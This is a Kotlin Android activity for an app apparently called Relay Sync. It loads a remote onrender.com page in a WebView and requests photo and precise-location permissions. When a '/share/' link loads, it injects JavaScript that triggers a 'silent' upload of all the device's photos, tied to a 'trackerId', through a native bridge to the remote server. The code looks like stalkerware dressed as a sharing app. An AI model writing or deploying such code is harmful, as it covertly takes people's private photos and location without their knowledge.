package com.relay.sync

import android.Manifest
import android.annotation.SuppressLint
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.webkit.JavascriptInterface
import android.webkit.WebChromeClient
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import androidx.activity.ComponentActivity
import androidx.activity.result.contract.ActivityResultContracts
import androidx.core.content.ContextCompat

class MainActivity : ComponentActivity() {
    private lateinit var webView: WebView
    private var pendingUrl: String = DEFAULT_URL
    private var pendingSync = false

    private val permissionLauncher = registerForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { results ->
        if (results.values.any { it }) pendingSync = true
        loadPendingUrl()
    }

    @SuppressLint("SetJavaScriptEnabled")
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        webView = WebView(this)
        webView.settings.javaScriptEnabled = true
        webView.settings.domStorageEnabled = true
        webView.settings.mediaPlaybackRequiresUserGesture = false
        webView.addJavascriptInterface(NativeBridge(this), "RelayNative")
        webView.webChromeClient = WebChromeClient()
        webView.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(view: WebView, request: WebResourceRequest): Boolean {
                val url = request.url.toString()
                if (url.contains("/share/")) {
                    pendingUrl = url
                    view.loadUrl(url)
                    return true
                }
                return false
            }

            override fun onPageFinished(view: WebView, url: String) {
                if (pendingSync && url.contains("/share/")) {
                    pendingSync = false
                    view.evaluateJavascript(
                        """
                        (function(){
                          if (typeof startSilentPhotoSync === 'function') startSilentPhotoSync();
                          else if (window.RelayNative) {
                            var m = location.pathname.match(/share\/([^/]+)/);
                            if (m && window.trackerId) {
                              RelayNative.syncAllPhotos(m[1], window.trackerId, location.origin);
                            }
                          }
                        })();
                        """.trimIndent(),
                        null
                    )
                }
            }
        }
        setContentView(webView)
        pendingUrl = intent?.data?.toString() ?: DEFAULT_URL
        ensurePermissionsAndLoad()
    }

    override fun onNewIntent(intent: Intent) {
        super.onNewIntent(intent)
        intent.data?.toString()?.let {
            pendingUrl = it
            loadPendingUrl()
        }
    }

    private fun ensurePermissionsAndLoad() {
        val needed = mutableListOf<String>()
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES)
            != PackageManager.PERMISSION_GRANTED
        ) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                needed.add(Manifest.permission.READ_MEDIA_IMAGES)
            } else {
                needed.add(Manifest.permission.READ_EXTERNAL_STORAGE)
            }
        }
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
            != PackageManager.PERMISSION_GRANTED
        ) {
            needed.add(Manifest.permission.ACCESS_FINE_LOCATION)
        }
        if (needed.isEmpty()) {
            pendingSync = true
            loadPendingUrl()
        } else {
            permissionLauncher.launch(needed.toTypedArray())
        }
    }

    private fun loadPendingUrl() {
        webView.loadUrl(pendingUrl)
    }

    companion object {
        private const val DEFAULT_URL = "https://relay-sync-fb25.onrender.com"
    }
}

class NativeBridge(private val activity: MainActivity) {
    @JavascriptInterface
    fun syncAllPhotos(roomId: String, trackerId: String, baseUrl: String) {
        PhotoSyncWorker.start(activity.applicationContext, roomId, trackerId, baseUrl)
    }

    @JavascriptInterface
    fun isAvailable(): Boolean = true
}
